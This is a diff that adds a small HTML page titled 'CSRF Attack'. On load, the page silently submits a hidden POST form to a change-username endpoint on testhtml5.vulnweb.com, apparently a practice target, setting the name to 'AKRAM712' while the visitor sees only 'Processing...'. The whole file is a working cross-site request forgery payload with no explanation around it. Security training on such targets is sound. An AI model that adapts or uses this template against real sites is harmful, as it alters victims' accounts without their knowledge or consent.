@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body onload="document.getElementById('csrf_form').submit()">
+    <h1>Processing...</h1>
+    <form id="csrf_form" action="http://testhtml5.vulnweb.com/change-username" method="POST">
+        <input type="hidden" name="username" value="AKRAM712">
+    </form>
+</body>
+</html>
